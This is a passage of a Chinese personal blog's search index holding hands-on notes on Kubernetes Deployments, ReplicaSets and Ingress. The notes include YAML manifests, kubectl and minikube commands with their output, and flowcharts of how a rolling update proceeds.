會等待設定的時間後才繼續進行升級流程 如果沒有此欄位的話，Kubernetes 會假設該容器一開完後即可進行服務 若未設定此欄位，在某些極端情況下可能會造成服務無法正常運作(新誕生的 pod 尚未進入可服務階段) maxSurge: 升級過程中最多可以比原先設定所多出的 pod 數量 此欄位可以為固定值或是比例(%) ex. maxSurge: 1、replicas: 5，代表 Kubernetes 會先開好 1 個新 pod 後才刪掉一個舊的 pod，整個升級過程中最多會有 5+1 個 pod maxUnavailable: 最多可以有幾個 pod 處在無法服務的狀態 當 maxSurge 不為零時，此欄位亦不可為零 ex. maxUnavailable: 1，代表 Kubernetes 整個升級過程中最多會有 1 個 pod 處在無法服務的狀態 參考:透過 Kubernetes Deployments 實現滾動升級 | Kubernetes [Kubernetes] Deployment Overview | 小信豬的原始部落 ","date":"2021-02-14","objectID":"/blog/posts/Kubernetes-%E7%9A%84-Deployment/:8:0","tags":["kubernetes","deployment"],"title":"Kubernetes 的 Deployment","uri":"/blog/posts/Kubernetes-%E7%9A%84-Deployment/"},{"categories":["Kubernetes"],"content":"rolling update 更新順序圖(重要) 怕之後忘記，特別紀錄一下更新過程。 最原始 Deployment 狀況 flowchart TD A[Deparment] --\u003eB(ReplicaSet 1) B --\u003e D[Pod 1] B --\u003e E[Pod 2] B --\u003e F[Pod 3] 部署新版本，會新增 ReplicaSet 會如下 flowchart TD A[Deparment] --\u003eB(ReplicaSet 1) A --\u003eB2(ReplicaSet 2) B --\u003e D[Pod 1] B --\u003e E[Pod 2] B --\u003e F[Pod 3] 剛加的 ReplicaSet 會把Pod先建立，成功的話，才會把ReplicaSet 舊的刪掉，查看下面兩個圖比較清楚。 flowchart TD A[Deparment] --\u003e|Replica: 3|B(ReplicaSet 1) A --\u003e|Replica: 1 |B2(ReplicaSet 2) B --\u003e D[Pod 1] B --\u003e E[Pod 2] B --\u003e F[Pod 3] B2 --\u003e| 先建立一個pod| G[Pod 4] flowchart TD A[Deparment] --\u003e|Replica: 2|B(ReplicaSet 1) A --\u003e|Replica: 1 |B2(ReplicaSet 2) B .-\u003e|刪除一個Pod| D[Pod 1] B --\u003e E[Pod 2] B --\u003e F[Pod 3] B2 --\u003eG[Pod 4] 剛加的 ReplicaSet 會把Pod先建立，成功的話，才會把ReplicaSet 舊的刪掉(loop第二次) flowchart TD A[Deparment] --\u003e|Repica: 2|B(ReplicaSet 1) A --\u003e|Repica: 2 |B2(ReplicaSet 2) B --\u003e E[Pod 2] B --\u003e F[Pod 3] B2 --\u003eG[Pod 4] B2 --\u003e|建立一個Pod|H[Pod 5] flowchart TD A[Deparment] --\u003e|Repica: 1|B(ReplicaSet 1) A --\u003e|Repica: 2 |B2(ReplicaSet 2) B .-\u003e|刪除一個Pod| E[Pod 2] B --\u003e F[Pod 3] B2 --\u003eG[Pod 4] B2 --\u003eH[Pod 5] 剛加的 ReplicaSet 會把Pod先建立，成功的話，才會把ReplicaSet 舊的刪掉(loop第三次) flowchart TD A[Deparment] --\u003e|Repica: 1|B(ReplicaSet 1) A --\u003e|Repica: 3 |B2(ReplicaSet 2) B --\u003e F[Pod 3] B2 --\u003eG[Pod 4] B2 --\u003eH[Pod 5] B2 --\u003e|建立新的Pod|J[Pod 6] flowchart TD A[Deparment] --\u003e|Repica: 0|B(ReplicaSet 1) A --\u003e|Repica: 3 |B2(ReplicaSet 2) B --\u003e |刪除一個Pod|F[Pod 3] B2 --\u003eG[Pod 4] B2 --\u003eH[Pod 5] B2 --\u003eJ[Pod 6] flowchart TD A[Deparment] --\u003e|Repica: 3 |B2(ReplicaSet 2) B2 --\u003eG[Pod 4] B2 --\u003eH[Pod 5] B2 --\u003eJ[Pod 6] 這邊要注意舊的ReplicaSet不會刪除掉，因為之後RollBack程式透過上面機制可以做相反。 ","date":"2021-02-14","objectID":"/blog/posts/Kubernetes-%E7%9A%84-Deployment/:9:0","tags":["kubernetes","deployment"],"title":"Kubernetes 的 Deployment","uri":"/blog/posts/Kubernetes-%E7%9A%84-Deployment/"},{"categories":["Kubernetes"],"content":"刪除 Deployment kubectl delete deployments kuard-deployment 所有的 Pod ,ReplicaSet 都會一起刪除 ","date":"2021-02-14","objectID":"/blog/posts/Kubernetes-%E7%9A%84-Deployment/:10:0","tags":["kubernetes","deployment"],"title":"Kubernetes 的 Deployment","uri":"/blog/posts/Kubernetes-%E7%9A%84-Deployment/"},{"categories":["Kubernetes"],"content":"感想 上面我測試 Service 更做更新的時候 不是會有舊新同時運行狀況 後面書上有提到前端到後端，前端要做好版本前後相容問題 這樣在切換上才不會發生問題 ","date":"2021-02-14","objectID":"/blog/posts/Kubernetes-%E7%9A%84-Deployment/:11:0","tags":["kubernetes","deployment"],"title":"Kubernetes 的 Deployment","uri":"/blog/posts/Kubernetes-%E7%9A%84-Deployment/"},{"categories":["Kubernetes"],"content":"小記 Deployment 就是用 ReplicaSet 進行的 Pod 做版本更新(升級、降級)。 一個 Deployment -\u003e最新兩個ReplicasSet -\u003ePod，做 Rolling Update 這個流程很重要，可以看上面更新流程圖 ","date":"2021-02-14","objectID":"/blog/posts/Kubernetes-%E7%9A%84-Deployment/:12:0","tags":["kubernetes","deployment"],"title":"Kubernetes 的 Deployment","uri":"/blog/posts/Kubernetes-%E7%9A%84-Deployment/"},{"categories":["Kubernetes"],"content":"我目前看書上是舊版範例 所以使用官方ReplicaSet | Kubernetes範例 目前推薦 [Kubernetes] ReplicaSet 介紹 | 小信豬的原始部落 這邊只是會放操作紀錄，不會很專業解說 ","date":"2021-02-13","objectID":"/blog/posts/Kubernetes-%E7%9A%84-ReplicasSet/:0:0","tags":["kubernetes","replicasset"],"title":"Kubernetes 的 ReplicaSet","uri":"/blog/posts/Kubernetes-%E7%9A%84-ReplicasSet/"},{"categories":["Kubernetes"],"content":"前言 一般建立 pod 完可以在建立 service 我以為 ReplicaSet 也是差不多樣子 但實作完才發現不一樣… 建立 ReplicaSet 就會建立 Pod ","date":"2021-02-13","objectID":"/blog/posts/Kubernetes-%E7%9A%84-ReplicasSet/:1:0","tags":["kubernetes","replicasset"],"title":"Kubernetes 的 ReplicaSet","uri":"/blog/posts/Kubernetes-%E7%9A%84-ReplicasSet/"},{"categories":["Kubernetes"],"content":"建立有 template 的 ReplicaSet apiVersion: apps/v1 kind: ReplicaSet metadata: name: frontend labels: app: guestbook tier: frontend spec: # modify replicas according to your case replicas: 3 selector: matchLabels: tier: frontend template: metadata: labels: tier: frontend spec: containers: - name: php-redis image: gcr.io/google_samples/gb-frontend:v3 # 建立 fronted ReplicaSet kubectl apply -f https://kubernetes.io/examples/controllers/frontend.yaml # replicaset.apps/frontend created # 查看狀況 kubectl get rs # NAME DESIRED CURRENT READY AGE # frontend 3 3 3 25s kubectl describle rs/fronted # Name: frontend # Namespace: default # Selector: tier=frontend # Labels: app=guestbook # tier=frontend # Annotations: \u003cnone\u003e # Replicas: 3 current / 3 desired # Pods Status: 3 Running / 0 Waiting / 0 Succeeded / 0 Failed # Pod Template: # Labels: tier=frontend # Containers: # php-redis: # Image: gcr.io/google_samples/gb-frontend:v3 # Port: \u003cnone\u003e # Host Port: \u003cnone\u003e # Environment: \u003cnone\u003e # Mounts: \u003cnone\u003e # Volumes: \u003cnone\u003e # Events: # Type Reason Age From Message # ---- ------ ---- ---- ------- # Normal SuccessfulCreate 53s replicaset-controller Created pod: frontend-bfdqg # Normal SuccessfulCreate 53s replicaset-controller Created pod: frontend-7rlhd # Normal SuccessfulCreate 53s replicaset-controller Created pod: frontend-p54kd kubectl get pods # NAME READY STATUS RESTARTS AGE # frontend-b2zdv 1/1 Running 0 6m36s # frontend-vcmts 1/1 Running 0 6m36s # frontend-wtsmm 1/1 Running 0 6m36s kubectl get pods frontend-b2zdv -o yaml 查看 meta.ownerReferences 這邊先跳過 详解 Kubernetes ReplicaSet 的实现原理 - 面向信仰编程 ","date":"2021-02-13","objectID":"/blog/posts/Kubernetes-%E7%9A%84-ReplicasSet/:2:0","tags":["kubernetes","replicasset"],"title":"Kubernetes 的 ReplicaSet","uri":"/blog/posts/Kubernetes-%E7%9A%84-ReplicasSet/"},{"categories":["Kubernetes"],"content":"無 template 建立 apiVersion: v1 kind: Pod metadata: name: pod1 labels: tier: frontend spec: containers: - name: hello1 image: gcr.io/google-samples/hello-app:2.0 --- apiVersion: v1 kind: Pod metadata: name: pod2 labels: tier: frontend spec: containers: - name: hello2 image: gcr.io/google-samples/hello-app:1.0 kubectl apply -f https://kubernetes.io/examples/pods/pod-rs.yaml kubectl get pods # NAME READY STATUS RESTARTS AGE # frontend-7rlhd 1/1 Running 0 10m # frontend-bfdqg 1/1 Running 0 10m # frontend-p54kd 1/1 Running 0 10m # pod1 0/1 Terminating 0 5s # pod2 0/1 Terminating 0 5s 這邊會看到，我們建立的 pod 沒有變建立起來 原因是 ReplicaSet 設定為三，已經建立過了(label 相同) 如果清空，先建立兩個 pod 再 新增 rs 會友不一樣的結果 NAME READY STATUS RESTARTS AGE frontend-hmmj2 1/1 Running 0 9s pod1 1/1 Running 0 36s pod2 1/1 Running 0 36s ","date":"2021-02-13","objectID":"/blog/posts/Kubernetes-%E7%9A%84-ReplicasSet/:3:0","tags":["kubernetes","replicasset"],"title":"Kubernetes 的 ReplicaSet","uri":"/blog/posts/Kubernetes-%E7%9A%84-ReplicasSet/"},{"categories":["Kubernetes"],"content":"擴展 ReplicaSet ","date":"2021-02-13","objectID":"/blog/posts/Kubernetes-%E7%9A%84-ReplicasSet/:4:0","tags":["kubernetes","replicasset"],"title":"Kubernetes 的 ReplicaSet","uri":"/blog/posts/Kubernetes-%E7%9A%84-ReplicasSet/"},{"categories":["Kubernetes"],"content":"指令 kubectl scale replicasets fronted --replicas=4 指令操作可以直接套用 但大多數不推薦這個方式 假如 yaml 重建不會用到 大多數都從文件調整 ","date":"2021-02-13","objectID":"/blog/posts/Kubernetes-%E7%9A%84-ReplicasSet/:4:1","tags":["kubernetes","replicasset"],"title":"Kubernetes 的 ReplicaSet","uri":"/blog/posts/Kubernetes-%E7%9A%84-ReplicasSet/"},{"categories":["Kubernetes"],"content":"kubectl apply 套用 kubectl apply -f xxx.yaml ","date":"2021-02-13","objectID":"/blog/posts/Kubernetes-%E7%9A%84-ReplicasSet/:5:0","tags":["kubernetes","replicasset"],"title":"Kubernetes 的 ReplicaSet","uri":"/blog/posts/Kubernetes-%E7%9A%84-ReplicasSet/"},{"categories":["Kubernetes"],"content":"自動擴展 apiVersion: autoscaling/v1 kind: HorizontalPodAutoscaler metadata: name: frontend-scaler spec: scaleTargetRef: kind: ReplicaSet name: frontend minReplicas: 3 maxReplicas: 10 targetCPUUtilizationPercentage: 50 kubectl apply -f https://k8s.io/examples/controllers/hpa-rs.yaml 或只打指令kubectl autoscale rs frontend --max=10 --min=3 --cpu-percent=50 看完這麼多，官方推薦使用 Deployment 來替代 ReplicaSet 這單元簡單操作並不難 ","date":"2021-02-13","objectID":"/blog/posts/Kubernetes-%E7%9A%84-ReplicasSet/:6:0","tags":["kubernetes","replicasset"],"title":"Kubernetes 的 ReplicaSet","uri":"/blog/posts/Kubernetes-%E7%9A%84-ReplicasSet/"},{"categories":["Kubernetes"],"content":"刪除 ReplicaSet 不刪除 pod 刪除 ReplicaSet 會一起刪除 pod 要刪除 ReplicaSet 不刪除 pod 情況下要使用 # 書上這樣寫，但好像廢棄了 kubectl delete rs fronted --cascade=false # warning: --cascade=false is deprecated (boolean value) and can be replaced with --cascade=orphan. kubectl delete rs frontend --cascade=orphan # 也能正常運作 StatefulSet介绍 - taotaozh - 博客园 不知道跟這個有沒有關係 暫時不研究 ","date":"2021-02-13","objectID":"/blog/posts/Kubernetes-%E7%9A%84-ReplicasSet/:7:0","tags":["kubernetes","replicasset"],"title":"Kubernetes 的 ReplicaSet","uri":"/blog/posts/Kubernetes-%E7%9A%84-ReplicasSet/"},{"categories":["Kubernetes"],"content":"小記重點 確保在任何時間點會有幾個副本。 相同Pod都是可用的，取決你設定的數字。 透過 selector 綁定在一起 ","date":"2021-02-13","objectID":"/blog/posts/Kubernetes-%E7%9A%84-ReplicasSet/:8:0","tags":["kubernetes","replicasset"],"title":"Kubernetes 的 ReplicaSet","uri":"/blog/posts/Kubernetes-%E7%9A%84-ReplicasSet/"},{"categories":["Kubernetes"],"content":"觀察指令 kubectl describe rs kubectl get pods # Controller By 可以觀察是誰操控 Pod ","date":"2021-02-13","objectID":"/blog/posts/Kubernetes-%E7%9A%84-ReplicasSet/:9:0","tags":["kubernetes","replicasset"],"title":"Kubernetes 的 ReplicaSet","uri":"/blog/posts/Kubernetes-%E7%9A%84-ReplicasSet/"},{"categories":["Kubernetes"],"content":"最近我在學習 Kubernetes，我有問我 K8S 裡面使用 load balance 能不能做到 Cookies 第一次指向到某一台 Server 我那時後才學到 Service ，Service 是使用 iptable 所以應該無法做到 我剛看到 Ingress 章節，應該是可以做到我朋友需求 但仔細想想，探討這個問題也應該沒有意義 使用 K8S 應該就是使用微服務架構，探討 Server 會不會掛掉或更新， Pod 都一定會重置 搜為網路上看一下， 單獨 Ingress 不是可以做到，需要一個 Ingress Controller 才能做到(這邊這個好像就是 nginx 這種東西) 不過，Ingress 和 Ingress Controller Ingress 本身並沒有提供負載平衡的功能，還需要透過 Ingress Controller 來實現。Ingress Controller 目前主要支援兩種型別 GCE 與 Nginx，而今天我們將透過 Nginx Ingress Controller 在 Kubernetes Cluster 內部架設 load balancer。 來源: [Day 19] 在 Kubernetes 中實現負載平衡 - Ingress Controller - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天 2021-02-04 我找到我朋友說的使用 load balance 能不能做到 Cookies 第一次指向到某一台 Server 專有述語叫做 Sticky Session Nginx Ingress Controller 可以做到 Sticky Sessions - NGINX Ingress Controller Services - Traefik Ingress session sticky_总结、分享、交流-CSDN博客 結論還是能做到的 ","date":"2021-02-11","objectID":"/blog/posts/Kubernetes-%E4%BD%BF%E7%94%A8-Ingress-%E5%81%9A%E8%B2%A0%E8%BC%89%E5%B9%B3%E8%A1%A1/:0:0","tags":["Kubernetes","ingress"],"title":"Kubernetes 使用 Ingress 做負載平衡","uri":"/blog/posts/Kubernetes-%E4%BD%BF%E7%94%A8-Ingress-%E5%81%9A%E8%B2%A0%E8%BC%89%E5%B9%B3%E8%A1%A1/"},{"categories":["Kubernetes"],"content":"前言 之前有碰過 traefik ，在使用 docker 情況下 ，traefik 是使用 docker label 去抓設定 我原本以為 K8s 應該也差不多 後來看到 Ingress 跟 Ingress Controller 一直在想這件事情 突然想到 Ingress 應該就控制網站Virtual Server(不確定是不是這樣叫) 設定 Ingress Controller 可能是 Apache , nginx (類似這些東西做反向代理) 這樣換不同 Ingress Controller 也不用重新設定 應該是這樣定位吧(我自己想的) 教學還是建議看 [Day 19] 在 Kubernetes 中實現負載平衡 - Ingress Controller - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天 我這邊還是以操作紀錄為主 Kind 由於先前發現做 NodePort 會有問題，這邊用 minikube 可能比較不會出狀況 當然官方也是有方法可以避免 可以看一下官方操作方法kind – Ingress 主要是 expose port ","date":"2021-02-11","objectID":"/blog/posts/Kubernetes-%E4%BD%BF%E7%94%A8-Ingress-%E5%81%9A%E8%B2%A0%E8%BC%89%E5%B9%B3%E8%A1%A1/:1:0","tags":["Kubernetes","ingress"],"title":"Kubernetes 使用 Ingress 做負載平衡","uri":"/blog/posts/Kubernetes-%E4%BD%BF%E7%94%A8-Ingress-%E5%81%9A%E8%B2%A0%E8%BC%89%E5%B9%B3%E8%A1%A1/"},{"categories":["Kubernetes"],"content":"Kind 官方設定教學 ","date":"2021-02-11","objectID":"/blog/posts/Kubernetes-%E4%BD%BF%E7%94%A8-Ingress-%E5%81%9A%E8%B2%A0%E8%BC%89%E5%B9%B3%E8%A1%A1/:2:0","tags":["Kubernetes","ingress"],"title":"Kubernetes 使用 Ingress 做負載平衡","uri":"/blog/posts/Kubernetes-%E4%BD%BF%E7%94%A8-Ingress-%E5%81%9A%E8%B2%A0%E8%BC%89%E5%B9%B3%E8%A1%A1/"},{"categories":["Kubernetes"],"content":"對應環境設定 (Kind) kind delete cluster # 確定刪除 kubectl config get-context # 確定使用的 k8s 連結設定 cat \u003c\u003cEOF | kind create cluster --config=- kind: Cluster apiVersion: kind.x-k8s.io/v1alpha4 nodes: - role: control-plane kubeadmConfigPatches: - | kind: InitConfiguration nodeRegistration: kubeletExtraArgs: node-labels: \"ingress-ready=true\" extraPortMappings: - containerPort: 80 hostPort: 80 protocol: TCP - containerPort: 443 hostPort: 443 protocol: TCP EOF ","date":"2021-02-11","objectID":"/blog/posts/Kubernetes-%E4%BD%BF%E7%94%A8-Ingress-%E5%81%9A%E8%B2%A0%E8%BC%89%E5%B9%B3%E8%A1%A1/:2:1","tags":["Kubernetes","ingress"],"title":"Kubernetes 使用 Ingress 做負載平衡","uri":"/blog/posts/Kubernetes-%E4%BD%BF%E7%94%A8-Ingress-%E5%81%9A%E8%B2%A0%E8%BC%89%E5%B9%B3%E8%A1%A1/"},{"categories":["Kubernetes"],"content":"安裝 Contour (Ingress Controller) kubectl apply -f https://projectcontour.io/quickstart/contour.yaml # namespace/projectcontour created # serviceaccount/contour created # serviceaccount/envoy created # configmap/contour created # customresourcedefinition.apiextensions.k8s.io/extensionservices.projectcontour.io created # customresourcedefinition.apiextensions.k8s.io/httpproxies.projectcontour.io created # customresourcedefinition.apiextensions.k8s.io/tlscertificatedelegations.projectcontour.io created # serviceaccount/contour-certgen created # rolebinding.rbac.authorization.k8s.io/contour created # role.rbac.authorization.k8s.io/contour-certgen created # job.batch/contour-certgen-v1.12.0 created # clusterrolebinding.rbac.authorization.k8s.io/contour created # clusterrole.rbac.authorization.k8s.io/contour created # service/contour created # service/envoy created # deployment.apps/contour created # daemonset.apps/envoy created ","date":"2021-02-11","objectID":"/blog/posts/Kubernetes-%E4%BD%BF%E7%94%A8-Ingress-%E5%81%9A%E8%B2%A0%E8%BC%89%E5%B9%B3%E8%A1%A1/:2:2","tags":["Kubernetes","ingress"],"title":"Kubernetes 使用 Ingress 做負載平衡","uri":"/blog/posts/Kubernetes-%E4%BD%BF%E7%94%A8-Ingress-%E5%81%9A%E8%B2%A0%E8%BC%89%E5%B9%B3%E8%A1%A1/"},{"categories":["Kubernetes"],"content":"設定 daemonsets { \"spec\": { \"template\": { \"spec\": { \"nodeSelector\": { \"ingress-ready\": \"true\" }, \"tolerations\": [ { \"key\": \"node-role.kubernetes.io/master\", \"operator\": \"Equal\", \"effect\": \"NoSchedule\" } ] } } } } kubectl patch daemonsets -n projectcontour envoy -p '{\"spec\":{\"template\":{\"spec\":{\"nodeSelector\":{\"ingress-ready\":\"true\"},\"tolerations\":[{\"key\":\"node-role.kubernetes.io/master\",\"operator\":\"Equal\",\"effect\":\"NoSchedule\"}]}}}}' 先設定，之後代研究這個是做什麼用 但我發現這個沒設定好像也能跑 = =a ","date":"2021-02-11","objectID":"/blog/posts/Kubernetes-%E4%BD%BF%E7%94%A8-Ingress-%E5%81%9A%E8%B2%A0%E8%BC%89%E5%B9%B3%E8%A1%A1/:2:3","tags":["Kubernetes","ingress"],"title":"Kubernetes 使用 Ingress 做負載平衡","uri":"/blog/posts/Kubernetes-%E4%BD%BF%E7%94%A8-Ingress-%E5%81%9A%E8%B2%A0%E8%BC%89%E5%B9%B3%E8%A1%A1/"},{"categories":["Kubernetes"],"content":"使用 Ingress 預設好像就有這個，所以不需要特別裝 kind: Pod apiVersion: v1 metadata: name: foo-app labels: app: foo spec: containers: - name: foo-app image: hashicorp/http-echo:0.2.3 args: - \"-text=foo\" --- kind: Service apiVersion: v1 metadata: name: foo-service spec: selector: app: foo ports: # Default port used by the image - port: 5678 --- kind: Pod apiVersion: v1 metadata: name: bar-app labels: app: bar spec: containers: - name: bar-app image: hashicorp/http-echo:0.2.3 args: - \"-text=bar\" --- kind: Service apiVersion: v1 metadata: name: bar-service spec: selector: app: bar ports: # Default port used by the image - port: 5678 --- apiVersion: networking.k8s.io/v1beta1 kind: Ingress metadata: name: example-ingress spec: rules: - http: paths: - path: /foo backend: serviceName: foo-service servicePort: 5678 - path: /bar backend: serviceName: bar-service servicePort: 5678 --- 上面建立兩個pod,service，然後新增 Ingress 設定 kubectl apply -f https://kind.sigs.k8s.io/examples/ingress/usage.yaml ","date":"2021-02-11","objectID":"/blog/posts/Kubernetes-%E4%BD%BF%E7%94%A8-Ingress-%E5%81%9A%E8%B2%A0%E8%BC%89%E5%B9%B3%E8%A1%A1/:2:4","tags":["Kubernetes","ingress"],"title":"Kubernetes 使用 Ingress 做負載平衡","uri":"/blog/posts/Kubernetes-%E4%BD%BF%E7%94%A8-Ingress-%E5%81%9A%E8%B2%A0%E8%BC%89%E5%B9%B3%E8%A1%A1/"},{"categories":["Kubernetes"],"content":"執行內容 # should output \"foo\" curl localhost/foo # should output \"bar\" curl localhost/bar ","date":"2021-02-11","objectID":"/blog/posts/Kubernetes-%E4%BD%BF%E7%94%A8-Ingress-%E5%81%9A%E8%B2%A0%E8%BC%89%E5%B9%B3%E8%A1%A1/:2:5","tags":["Kubernetes","ingress"],"title":"Kubernetes 使用 Ingress 做負載平衡","uri":"/blog/posts/Kubernetes-%E4%BD%BF%E7%94%A8-Ingress-%E5%81%9A%E8%B2%A0%E8%BC%89%E5%B9%B3%E8%A1%A1/"},{"categories":["Kubernetes"],"content":"查看 Ingress 指令 kubectl get ingress kubectl describle ingress simple-ingress ","date":"2021-02-11","objectID":"/blog/posts/Kubernetes-%E4%BD%BF%E7%94%A8-Ingress-%E5%81%9A%E8%B2%A0%E8%BC%89%E5%B9%B3%E8%A1%A1/:2:6","tags":["Kubernetes","ingress"],"title":"Kubernetes 使用 Ingress 做負載平衡","uri":"/blog/posts/Kubernetes-%E4%BD%BF%E7%94%A8-Ingress-%E5%81%9A%E8%B2%A0%E8%BC%89%E5%B9%B3%E8%A1%A1/"},{"categories":["Kubernetes"],"content":"kubernetes之ingress error: endpoints “default-http-backend” not found 翻譯： 控制器。注意:根據您正在使用的Ingress控制器，您可能需要創建一個default-http-backend服務。 違約後端 沒有規則的入口將所有流量發送到一個默認後端。默認後端通常是Ingress控制器的一個配置選項，在您的Ingress資源中沒有指定。 如果Ingress對象中的主機或路徑都不匹配HTTP請求，則流量將被路由到默認後端。 參考:kubernetes之ingress error: endpoints “default-http-backend” not found - Mr.zou - 博客园 ","date":"2021-02-11","objectID":"/blog/posts/Kubernetes-%E4%BD%BF%E7%94%A8-Ingress-%E5%81%9A%E8%B2%A0%E8%BC%89%E5%B9%B3%E8%A1%A1/:2:7","tags":["Kubernetes","ingress"],"title":"Kubernetes 使用 Ingress 做負載平衡","uri":"/blog/posts/Kubernetes-%E4%BD%BF%E7%94%A8-Ingress-%E5%81%9A%E8%B2%A0%E8%BC%89%E5%B9%B3%E8%A1%A1/"},{"categories":["Kubernetes"],"content":"使用 host 名稱對應 service 由於書中跟 [Day 19] 在 Kubernetes 中實現負載平衡 - Ingress Controller - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天 為了加速實作，這邊使用上面範例 ","date":"2021-02-11","objectID":"/blog/posts/Kubernetes-%E4%BD%BF%E7%94%A8-Ingress-%E5%81%9A%E8%B2%A0%E8%BC%89%E5%B9%B3%E8%A1%A1/:3:0","tags":["Kubernetes","ingress"],"title":"Kubernetes 使用 Ingress 做負載平衡","uri":"/blog/posts/Kubernetes-%E4%BD%BF%E7%94%A8-Ingress-%E5%81%9A%E8%B2%A0%E8%BC%89%E5%B9%B3%E8%A1%A1/"},{"categories":["Kubernetes"],"content":"使用 minikube # 啟用 minikube 的 ingress minikube addons enable ingress # 取得 minikube ip minikube ip ","date":"2021-02-11","objectID":"/blog/posts/Kubernetes-%E4%BD%BF%E7%94%A8-Ingress-%E5%81%9A%E8%B2%A0%E8%BC%89%E5%B9%B3%E8%A1%A1/:3:1","tags":["Kubernetes","ingress"],"title":"Kubernetes 使用 Ingress 做負載平衡","uri":"/blog/posts/Kubernetes-%E4%BD%BF%E7%94%A8-Ingress-%E5%81%9A%E8%B2%A0%E8%BC%89%E5%B9%B3%E8%A1%A1/"},{"categories":["Kubernetes"],"content":"service ,pod , ingress 設定 # 建立測試 pod kubectl create -f https://raw.githubusercontent.com/zxcvbnius/k8s-30-day-sharing/master/Day19/demo-ingress/helloworld-pod.yaml 事後想想這邊可以用上面範例 echo 出不同字串 這樣就可以知道用到哪一個 pod 建立兩個測試用 serivce 都倒同一個 service apiVersion: v1 kind: Service metadata: name: helloworld-v1 spec: ports: - port: 3000 protocol: TCP targetPort: 3000 selector: app: helloworld-pod apiVersion: v1 kind: Service metadata: name: helloworld-v2 spec: ports: - port: 3000 protocol: TCP targetPort: 3000 selector: app: helloworld-pod kubectl create -f https://raw.githubusercontent.com/zxcvbnius/k8s-30-day-sharing/master/Day19/demo-ingress/helloworld-service.yaml kubectl get svc # Name: helloworld-v1 # Namespace: default # Labels: \u003cnone\u003e # Annotations: \u003cnone\u003e # Selector: app=helloworld-pod # Type: ClusterIP # IP Families: \u003cnone\u003e # IP: 10.96.172.11 # IPs: \u003cnone\u003e # Port: \u003cunset\u003e 3000/TCP # TargetPort: 3000/TCP # Endpoints: 172.17.0.7:3000 # Session Affinity: None # Events: \u003cnone\u003e # Name: helloworld-v2 # Namespace: default # Labels: \u003cnone\u003e # Annotations: \u003cnone\u003e # Selector: app=helloworld-pod # Type: ClusterIP # IP Families: \u003cnone\u003e # IP: 10.96.251.221 # IPs: \u003cnone\u003e # Port: \u003cunset\u003e 3000/TCP # TargetPort: 3000/TCP # Endpoints: 172.17.0.7:3000 # Session Affinity: None # Events: \u003cnone\u003e 確認是否成功 # 進去 node 確認狀況 minikube ssh # 確認 pods 可以正常連到 curl 10.96.172.11:3000 繼續建立 ingress controller # 官方安裝 nginx ingress controller kubectl apply -f https://raw.githubusercontent.com/kubernetes/ingress-nginx/controller-v0.44.0/deploy/static/provider/baremetal/deploy.yaml # 原作yaml 無法建立 # error: error validating \"https://raw.githubusercontent.com/zxcvbnius/k8s-30-day-sharing/master/Day19/demo-ingress/nginx-ingress.yaml\": error validating data: [ValidationError(Ingress.metadata): unknown field \"kubernetes.io/ingress.class\" in io.k8s.apimachinery.pkg.apis.meta.v1.ObjectMeta, ValidationError(Ingress.spec.rules[0]): unknown field \"paths\" in io.k8s.api.extensions.v1beta1.IngressRule]; if you choose to ignore these errors, turn validation off with --validate=false vim nginx-ingress.yaml 參考 k8s-30-day-sharing/ingress-example-2.yaml at master · zxcvbnius/k8s-30-day-sharing 裡面 service name 有錯誤，建議使用下面複製 apiVersion: extensions/v1beta1 kind: Ingress metadata: name: example-2 spec: rules: - host: helloworld-v1.example.com http: paths: - path: / backend: serviceName: helloworld-v1 servicePort: 80 - host: helloworld-v2.example.com http: paths: - path: / backend: serviceName: helloworld-v2 servicePort: 80 ","date":"2021-02-11","objectID":"/blog/posts/Kubernetes-%E4%BD%BF%E7%94%A8-Ingress-%E5%81%9A%E8%B2%A0%E8%BC%89%E5%B9%B3%E8%A1%A1/:3:2","tags":["Kubernetes","ingress"],"title":"Kubernetes 使用 Ingress 做負載平衡","uri":"/blog/posts/Kubernetes-%E4%BD%BF%E7%94%A8-Ingress-%E5%81%9A%E8%B2%A0%E8%BC%89%E5%B9%B3%E8%A1%A1/"},{"categories":["Kubernetes"],"content":"測試 host 方法 curl -H 之前在 Raspberry PI 架設 Traefik 初體驗 | 程式狂想筆記這篇有紀錄 通常改 /etc/hosts 檔案或者curl 指令可以做到(這當初看到 traefik 官方文件寫的，還滿神奇的，畢竟很多教學沒這樣教) /etc/hosts # 這個 IP 是 node IP curl -H Host:helloworld-v1.example.com http://192.168.99.102/ curl -H Host:helloworld-v2.example.com http://192.168.99.102/ ","date":"2021-02-11","objectID":"/blog/posts/Kubernetes-%E4%BD%BF%E7%94%A8-Ingress-%E5%81%9A%E8%B2%A0%E8%BC%89%E5%B9%B3%E8%A1%A1/:3:3","tags":["Kubernetes","ingress"],"title":"Kubernetes 使用 Ingress 做負載平衡","uri":"/blog/posts/Kubernetes-%E4%BD%BF%E7%94%A8-Ingress-%E5%81%9A%E8%B2%A0%E8%BC%89%E5%B9%B3%E8%A1%A1/"},{"categories":["Kubernetes"],"content":"SSL termination(代理端做 tls) ingress-ssl-sceret.yaml apiVersion: v1 data: tls.crt: YmFzZTY0X2VuY29kZWRfY2VydA== tls.key: YmFzZTY0X2VuY29kZWRfa2V5 kind: Secret metadata: name: ssh-secret namespace: default type: Opaque example3-ingress.yaml apiVersion: extensions/v1beta1 kind: Ingress metadata: name: example-3 spec: tls: - secretName: ssh-secret backend: serviceName: helloworld-v1 servicePort: 3000 ","date":"2021-02-11","objectID":"/blog/posts/Kubernetes-%E4%BD%BF%E7%94%A8-Ingress-%E5%81%9A%E8%B2%A0%E8%BC%89%E5%B9%B3%E8%A1%A1/:4:0","tags":["Kubernetes","ingress"],"title":"Kubernetes 使用 Ingress 做負載平衡","uri":"/blog/posts/Kubernetes-%E4%BD%BF%E7%94%A8-Ingress-%E5%81%9A%E8%B2%A0%E8%BC%89%E5%B9%B3%E8%A1%A1/"},{"categories":["Kubernetes"],"content":"運行多個 Ingress Controller 一個叢集中運行多個Ingress 控制器，可以搭配 Annotation 的 kubernetes.io/ingress.class 如果沒有配置 kubernetes.io/ingress.class，會有多個不同Ingress Controller 搶 Ingress 使用權，並寫入Ingress 件的status 欄位 後面兩個就不先仔細研究 ","date":"2021-02-11","objectID":"/blog/posts/Kubernetes-%E4%BD%BF%E7%94%A8-Ingress-%E5%81%9A%E8%B2%A0%E8%BC%89%E5%B9%B3%E8%A1%A1/:5:0","tags":["Kubernetes","ingress"],"title":"Kubernetes 使用 Ingress 